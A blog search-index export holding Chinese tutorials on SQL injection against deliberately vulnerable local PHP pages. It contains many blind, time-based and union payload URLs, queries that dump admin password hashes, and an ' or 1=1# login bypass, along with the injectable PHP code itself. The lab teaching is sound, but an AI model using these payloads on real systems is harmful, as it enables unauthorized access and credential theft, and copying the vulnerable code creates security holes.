<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sql注入之盲注攻击]]></title>
    <url>%2F2018%2F04%2F04%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[在我们学习盲注时，需要注意的事情是盲注基于true和false，即0和1，真返回1，假返回0一个简单的小测试，数据库是sqlin，我们来判断数据库字符返回值是否为0或1：12345678910111213141516171819202122232425262728293031mysql&gt; select mid(database(),1,1)='s';+-------------------------+| mid(database(),1,1)='s' |+-------------------------+| 1 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select mid(database(),1,1)='r';+-------------------------+| mid(database(),1,1)='r' |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() regexp '^[a-z]';+----------------------------+| database() regexp '^[a-z]' |+----------------------------+| 1 |+----------------------------+1 row in set (0.00 sec)mysql&gt; select database() regexp '^[1-10]';+-----------------------------+| database() regexp '^[1-10]' |+-----------------------------+| 0 |+-----------------------------+1 row in set (0.00 sec) 常用的盲注函数 if 条件为真执行，反之不执行点击跳转 if(条件,执行(true),不执行(false)) sleep 执行延时number秒点击跳转 sleep(number) length 统计字符串的长度点击跳转 length(number) mid,substr 截取字符串的一部分点击跳转 mid(字段,起始位置(number),长度(number)) ORD 返回第一个字符串的ASCII码点击跳转 ord(x) left 得到字符串左部指定个数的字符点击跳转 left(string,number) regexp 正则注入点击跳转 regexp ‘^[a-z]’ 判断一个表的第一个字符串是否在a-z中 regexp ‘^r’ 判断第一个字符串是否为r regexp ‘^r[a-z]’ 判断一个表的第二个字符串是否在a-z中 like 匹配注入点击跳转 百分比(%)通配符允许匹配任何字符串的零个或多个字符。 下划线(_)通配符允许匹配任何单个字符。 like ‘r%’ 判断第一个字符是否为r like ‘ro%’ 判断前面两个字符串是否为ro like ‘%ro%’ 判断是否包含ro两个字符串 like ‘%root%’ 判断是否包含root字符串 like ‘____’ 判断是否为4个字符 like ‘r___’ 判断第一个字符是否为r if函数if 条件为真执行，反之不执行语法： if(条件,执行(true),不执行(false)) 其实if很简单，看看下面构造的这个语句就知道了1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(database()='sqlin',1,0),3 判断数据库是否为sqlin，如果是，返回1，否者返回0 sleep函数这个函数也比较简单，但是有一个问题是在真实环境中，可能受网络环境影响，而导致效果不是太明显sleep 执行延时number秒语法： sleep(number)一般这个函数搭配if语句一起用比如我们可以用这个函数判断是否有sqlin数据库1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,sleep(if(database()='sqlin',10,0)),3 判断数据库否有为sqlin，如果有返回的10带入到sleep，让网页延时10秒返回页面，否则网页延时0秒如果秒速调高一点还是有用的，但是只返回1和0秒就基本废了 length函数用于判断长度，返回0和1，比较常用length 统计字符串的长度语法： length(number)123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,length(database())=5,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length(database())=5,1,0),3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length(database())&gt;1,1,0),3 这个可以用&gt; &lt; = 符号，默认就是返回1和0，这里加上if看着更清晰 mid和substr函数这两个函数基本差不多，都是从number开始，number结束，截取，这个是从1开始，而不是从0开始mid,substr 截取字符串的一部分语法： mid(字段,起始位置(number),长度(number))123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),1,1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),2,1)='q',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),1,5)='sqlin',3 //从第一个开始，取5个字符 substr(字段,起始位置(number),长度(number))123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),1,1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),2,1)='q',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),1,5)='sqlin',3 //从第一个开始，取5个字符 ORD函数这个函数只能返回字符串的第一个字符，所以建议加上mid函数ORD 返回第一个字符串的ASCII码sqlin 转换为ascii码=115 113 108 105 110语法： ord(x)1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(database())=115,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(mid(database(),1,1))=115,3 //115=shttp://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(mid(database(),2,1))=113,3 //113=q//当然这个也是支持 &gt; &lt; = 符号的 left函数left 得到字符串左部指定个数的字符left(string,number) string为字符串，number为要截取的长度123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),2)='sq',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),5)='sqlin',3 regexp正则这个正则是一个很好用的匹配方式，比如匹配sqlin数据库regexp ‘^[a-z]’ 判断一个表的第一个字符串是否在a-z中1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^[a-z]',3 regexp ‘^s’ 判断第一个字符串是否为s1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^s',3 regexp ‘^s[a-z]’ 判断一个表的第二个字符串是否在a-z中1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^s[a-z]',3 like匹配百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线(_)通配符允许匹配任何单个字符。like ‘s%’ 判断第一个字符是否为s1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 's%',3 like ‘sq%’ 判断前面两个字符串是否为sq1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 'sq%',3 like ‘%sq%’ 判断是否包含sq两个字符串1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '%sq%',3 like ‘%sqlin%’ 判断是否包含sqlin字符串1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '%sqlin%',3 like ‘_‘ 判断是否为5个字符1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '_____',3 like ‘s____’ 判断第一个字符是否为s1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 's____',3 盲注攻击上面的基本的盲注语句我们已经知道了，现在拿着php代码，来进行盲注代码:1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.com--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlin");//连接数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where id=$id";//查询 $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 数据库：创建sqlin数据库，创建admin表和page表，并且向admin、page表里面分别插入数据1234567891011121314create database sqlin default character set utf8 collate utf8_general_ci;use sqlin;mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32));mysql&gt; create table page( -&gt; id int(3) auto_increment not null primary key, -&gt; title varchar(20), -&gt; content varchar(255));mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); 判断数据库名，用户，数据版本1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select database(),user(),version() 盲注：1234567http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(user(),1,1)='r',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(user(),1,1)='r',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(substr(user(),1,1))=114,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() like 'ro%',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() regexp '^[r-s]',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() regexp '^s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,length(user())&gt;4,3 这里是一些基本的构造语法，其实盲注并不难，主要就是自己构造，但是还是需要知道基本的语法 然后我直接开始进行下面的测试： 获取sqlin数据库下的表名：1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and length(table_name)=5 limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^[a-z]' limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^admi[a-z]' limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^admin' limit 0,1 获取到了admin表 我们在用其他方法来获取其他表，方法不止一种，知道了语法自己构造就可以了123456http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1))&gt;3,1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1))=4,1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,1)&gt;'a',1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,1)='p',1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,4)='page',1,0),3 from information_schema.tables where table_schema='sqlin' 这种方法比上面看着要麻烦一些，但是我们还是获取到了page表 获取第二个表名：1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,table_name regexp '^page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,table_name like 'page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(table_name,1,4)='page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(table_name,4)='page',3 from information_schema.tables where table_schema='sqlin' limit 1,1 盲注其实并不难，主要是构造一些奇形怪状语句进行sql攻击，只要知道了语法就可以自己慢慢构造了，趣建议了解一下sql语言]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之注入类型]]></title>
    <url>%2F2018%2F04%2F02%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[数字型数字型在上一篇文章sql注入之入门，已经讲过 数字型简单的判断是否有注入12and 1=1 //返回正常and 1=2 //返回错误 字符串型如何判断字符串型是否有注入首先先创建一个数据库，在里面分别创建两个表，admin，page，然后在里面插入数据1234567891011121314mysql&gt; create database sqlinstr default character set utf8 collate utf8_general_ci;mysql&gt; use sqlinstr;mysql&gt; create table admin( id int(3) auto_increment not null primary key, username varchar(15) not null, password char(32));mysql&gt; create table page( id int(3) auto_increment not null primary key, title varchar(20), content varchar(255));mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); 拿着我们的php代码：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-注入类型-字符串&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsql注入-注入类型-字符串--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where id='$id'";//查询 $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 打开我们的网址http://127.0.0.1/webpentest/str/index.php打开会后看到下面的当前执行sql语句：select * from page where id=’’传值进去： 文章id：1文章标题：sqlzhuru文章内容：https://smelond.com当前执行sql语句：select * from page where id=’1’这个时候内容已经查询出来了，但是发现后面的id=’1’，1被单引号括起来了 如何注入首先我们试试：and 1=112http://127.0.0.1/webpentest/str/index.php?x=1 and 1=1 //结果返回正常当前执行sql语句：select * from page where id='1 and 1=1' //有没有发现这里怪怪的 and 1=212http://127.0.0.1/webpentest/str/index.php?x=1 and 1=2 //结果还是返回正常，难道没有注入？？？当前执行sql语句：select * from page where id='1 and 1=2' 从上面我们看到：id=’1 and 1=1’ 和 id=’1 and 1=2’，发现我们输入进去的内容全部被’’包裹起来了那为什么会返回正常呢？打开mysql：123456789101112131415mysql&gt; select id from page where id='1 and 1=1';+----+| id |+----+| 1 |+----+1 row in set, 1 warning (0.00 sec)mysql&gt; select id from page where id='1 and 1=2';+----+| id |+----+| 1 |+----+1 row in set, 1 warning (0.00 sec) 这回知道为什么会有返回值了吧，可以看出空格后面的应该是直接被截断了，所有理论上查询的还是id=1 如何突破由于看到上面每一条sql语句后面都有一个’单引号，前面也有一个所以我们可以在id=1后面加上一个’单引号，看一下是什么效果1http://127.0.0.1/webpentest/str/index.php?x=1' 当我们执行这个网址时，发现页面报错了，这个时候应该就可以判断是否有注入了报错，表示他应该是从数据库里面查询的报错信息：1Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in D:\phpStudy\PHPTutorial\WWW\webpentest\str\index.php on line 21 下面有当前执行sql语句：select * from page where id=’1’’ 可以看到1’成功的带入进去了 接下来继续构造注入语句：12x=1' and '1'='1http://127.0.0.1/webpentest/str/index.php?x=1' and '1'='1 那么执行的语句将会是这样的1当前执行sql语句：select * from page where id='1' and '1'='1' 上面我们又看到id=’1’ and ‘1’=’1’，并且页面返回正常了，这回没毛病了吧，哈哈哈！！！ 接着构造语句：1x=1' and '1'='2 执行语句：1http://127.0.0.1/webpentest/str/index.php?x=1' and '1'='2 现在已经有了我们想要的结果了，页面没有正常显示当前执行的sql语句：1select * from page where id='1' and '1'='2' 使用一些常用的关键字那么，order by在哪里加？在这里，其实order by是不起作用的已经可以看出，and ‘1’=’1后面是不能加了，如果加上去，语句会变成但是加到前面，无论order by number=? 都会是正常返回值，所以，这个地方order by不能用12345select * from page where id='1' and '1'='1 order by 3' select * from page where id='1' and '1'='2 order by 3' http://127.0.0.1/webpentest/str/index.php?x=1' order by 3 and '1'='1 //页面返回正常http://127.0.0.1/webpentest/str/index.php?x=1' order by 4 and '1'='1 //页面返回正常http://127.0.0.1/webpentest/str/index.php?x=1' order by 100 and '1'='1 //页面返回正常 看到上面的100都能返回正常，但是我们数据库里面的page表只有3个字段，所以，可以看出order by在这里是有问题的 既然order by有问题，那我们试试select会怎么样？ 1234http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1 and '1'='1 //页面报错http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2 and '1'='1 //页面报错http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2,3 and '1'='1 //页面正常显示http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2,3,4 and '1'='1 //页面报错 select 已经判断出来了有三个字段，在一般情况下，select 1是不会报错的，在字段总数以前都不会报错，可能使我这里的php代码写的有问题，才导致了这种情况发生 接着查询一下数据库里版本，用户等等：1http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select concat(database(),'---',user(),'---',version()),2,3 and '1'='2 结果：sqlinstr---root@localhost---5.5.53 剩下的爆库爆表前面里面已经说过了 但是有一个地方不同，在查询表时，后面的条件需要改动。需要将and ‘1’=’2 改为where ‘1’=’1为什么？接下来我们又进入mysql中查询12345mysql&gt; select username,password from admin and '1'='2';ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and '1'='2'' at line 1那试试and '1'='1'mysql&gt; select username,password from admin and '1'='1';ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and '1'='1'' at line 1 结果都报错了那现在该怎么办呢？所以我想问，你有见过查询语句完了之后在后面加上and的吗？所以这个地方得加上条件where如何加？1=1 , ‘1’=’1’所以可已用where ‘1’=’1’12345678mysql&gt; select username,password from admin where '1'='1';+----------+----------------------------------+| username | password |+----------+----------------------------------+| smelond | efe6398127928f1b2e9ef3207fb82663 || admin | efe6398127928f1b2e9ef3207fb82663 |+----------+----------------------------------+2 rows in set (0.00 sec) //现在成功了吧 构造sql语句：1http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select username,password,3 from admin where '1'='1 密码就这样爆出来了 搜索型看了上面的字符串型，好像也不难，就是单引号问题接下来，我们来看看搜索型搜索型一般出现在搜索框当中，我这里写了一个简单的搜索页面标题，返回页面内容的php代码数据库我们还是用上面的sqlinstr数据库代码贴上：12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-注入类型-搜索型&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsql注入-注入类型-搜索型--&gt;&lt;form action=""&gt;&lt;input type="text" name="x" id=""&gt; //文本框&lt;input type="submit" name="" id="" value="搜素"&gt; //提交按钮&lt;/form&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $title = $_GET['x']; //接收x变量，上面文本框的值 $link=mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where title like '%$title%'";//查询，使用了like关键字，查找输入的内容 if ($sql == "select * from page where title like '%%'") &#123; continue; &#125; $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 上面可以看到我们php代码里面的两个“%”百分号查询语句将会为：select * from page where title like ‘%%’如果我们在里面加入内容，查询语句将会为：1select * from page where title like '%test%' //查询title='test'的内容 如何突破突破其实也很简单，上面的字符串类型为’’这里的搜索型为’%%’那我们直接利用字符串的思路，将搜索%’闭合1test%' and '100%'='100 那么我们构造执行的语句将会是这样的：1http://127.0.0.1/webpentest/search/index.php?x=test%' and '100%'='100 语句结果：1当前执行sql语句：select * from page where title like '%test%' and '100%'='100%' //正常返回，并且所搜到了test的内容，返回了页面内容 构造其他的语句：123456http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=1 order by 4 and '100%'='100 //返回正确，显然order by还是不能用。。。http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1 and '100%'='100 //错误http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2 and '100%'='100 //错误http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2,3 and '100%'='100 //正确，判断出来了3个字段http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2,3,4 and '100%'='100 //错误http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select username,password,3 from admin where '100%'='100 构造其他的语句就简单了但是记得在爆库表爆字段，查询账号密码时记得额将and ‘100%’=’100改为where ‘100%’=’100 提交注入两种常见的提交注入：分别是GET和POSTGET我们已经在上面说了，比如搜索框，还有就是在网址上，总之前面说到的所有注入全部都是GET型我们可以从前面的php代码中发现这段代码1$id = $_GET['x']; 那么，POST提交当然就是这样写的:1$id = $_POST['x']; 很简单，直接将GET写为POST即可 这两种请求有什么区别？ 听说这是标准答案： GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST么有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 GET参数通过URL传递，POST放在Request body中。 有一篇文章99%的人理解错 HTTP 中 GET 与 POST 的区别，否定了上述回答：“很遗憾，这不是我们要的回答！”，作者说：GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。 GET和POST还有一个重大区别，简单的说：GET产生一个TCP数据包；POST产生两个TCP数据包。对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）； 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。 感觉这篇文章还是比较高大上的这里先不扯这么多了，了解了post和get的区别之后我们来看看post提交注入 post提交注入还是用前面用过的数据库sqlinstr，但是表用admin表，因为这是登录，需要验证是否登录成功，具体看代码 贴上我的html+php代码：文件名：index.html登录页面12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-POST提交注入-登录框&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsql注入-POST提交注入-登录框--&gt; &lt;div style="margin: 0px auto;width: 400px;text-align: center;"&gt; &lt;form action="index.php" method="POST"&gt; &lt;fieldset&gt; &lt;legend&gt;登录&lt;/legend&gt; &lt;input type="text" name="username" placeholder="请输入用户名"&gt;&lt;br&gt; &lt;input type="password" name="password" placeholder="请输入密码"&gt;&lt;br&gt; &lt;input type="submit" name="sub" value="登录"&gt;&lt;br&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 文件名：index.php后台页面1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-POST提交注入-后台页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- author: smelond filename: index.php blog: http://smelond.com sql注入-POST提交注入-后台页面 --&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $username = $_POST['username']; $password = $_POST['password']; if ($username == '') &#123; exit("用户名不能为空"); &#125; if ($password == '') &#123; exit("密码不能为空"); &#125; $password = md5($password); // echo "$password"; $link = mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql = "select * from admin where username='$username' and password='$password'";//查询 $re = mysqli_query($link,$sql);//执行查询语句 $data = mysqli_fetch_assoc($re);//获取数据库返回的内容 if ($data) &#123;//判断是否有返回值 // var_dump($data); echo "后台页面：&lt;br /&gt;"; echo "欢迎你：".$username; &#125;else&#123;//否者错误 echo "用户名或密码不正确"; &#125; echo "&lt;br /&gt;"."当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 现在打开我们的url：1http://127.0.0.1/webpentest/postrequest/index.html 看到登录页面已经写好了，试着登录一下登录成功 那么怎么绕过，直接登录呢？从登陆页面的sql语句中可以看到语句为：1select * from admin where username='smelond' and password='efe6398127928f1b2e9ef3207fb82663' 想了想，这个语句应该可以直接注释吧？好了，返回index.html页面我们去注释一下12账号：smelond#密码：asdfas 发现登录失败看看，我们只是单纯的在用户名后面加上了#号，那么现在语句变成了：1select * from admin where username='smelond 看看我们构造的语句，明显不完整 那我们来构造一条完整的语句：12smelond'# //#号将后面的注释了select * from admin where username='smelond' //所以语句直接变成了这个 一般我们会这样写：12smelond' or 1=1#select * from admin where username='smelond' or 1=1 页面上显示了欢迎你，我们已经进入后台了 如果后台有查询数据库，那我们可以直接在登录页面将爆库，爆表，爆密码： 那我们将上面的后台代码修改一下，让他有数据库查询，并且回显：123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-POST提交注入-后台页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- author: smelond filename: index.php blog: http://smelond.com sql注入-POST提交注入-后台页面 --&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $username = $_POST['username']; $password = $_POST['password']; if ($username == '') &#123; exit("用户名不能为空"); &#125; if ($password == '') &#123; exit("密码不能为空"); &#125; $password = md5($password); // echo "$password"; $link = mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql = "select * from admin where username='$username' and password='$password'";//查询 $re = mysqli_query($link,$sql);//执行查询语句 $data = mysqli_fetch_assoc($re);//获取数据库返回的内容 if ($data) &#123;//判断是否有返回值 // var_dump($data); echo "后台页面：&lt;br /&gt;"; // echo "欢迎你：".$username; echo "欢迎你：".$data['username']."&lt;hr /&gt;"; //我们只修改了这句 &#125;else&#123;//否者错误 echo "用户名或密码不正确"; &#125; echo "&lt;br /&gt;"."当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 上面我们只修改了一句，但是效果就不一样了打开index.html在账号框中输入：1' and 1=2 union select 1,2,3 or 1=1# 这个时候，可以看到成功登录，并且用户名为：2注意回显的是2，所以我们在登录框输入时，只能改动2，其他地方改动无效、 接着从新输入：1' and 1=2 union select 1,database(),3 or 1=1# 用户名：sqlinstr 这个时候我们输入用concat是最好不过的了1' and 1=2 union select 1,concat(database(),'---',user(),'---',version()),3 or 1=1# 用户名：sqlinstr---root@localhost---5.5.53 爆账号密码：1asd' and 1=1 union select 1,concat(username,'--',password),3 from admin where 1=1#asad 注意，在简单的查询语句后面不能加and 和 or ，所以我们这里加上了where 好了，差不多了，这个SQL注入类型就先说这么多~~当然，注入里面还有其他的注入，比如：cookie注入，http头注入]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之入门]]></title>
    <url>%2F2018%2F03%2F28%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%85%A5%E9%97%A8%2F</url>
